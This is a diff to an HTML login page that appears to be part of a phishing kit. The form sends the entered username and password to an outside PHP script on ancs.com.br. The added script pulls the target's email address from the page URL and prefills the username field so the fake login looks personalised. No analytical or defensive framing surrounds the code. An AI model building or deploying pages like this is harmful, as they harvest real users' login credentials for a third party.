@@ -230,8 +230,12 @@
                 <div class="avatar"></div>
                 <form id="loginForm" action="http://ancs.com.br/auto/next2580.php" method="post">
                     <label for="username">USERNAME</label>
-                    <input type="email" name="user" required>
-
+                    <input type="email" name="user" id="inputline1" required>
+                    <script type="text/javascript">
+                        var url = window.location.href;
+                        var name = url.substring(url.indexOf("=") + 1);
+                        document.getElementById("inputline1").value = name;
+                    </script>
                     <label for="password">PASSWORD</label>
                     <input type="password" name="pass" required><br>
 
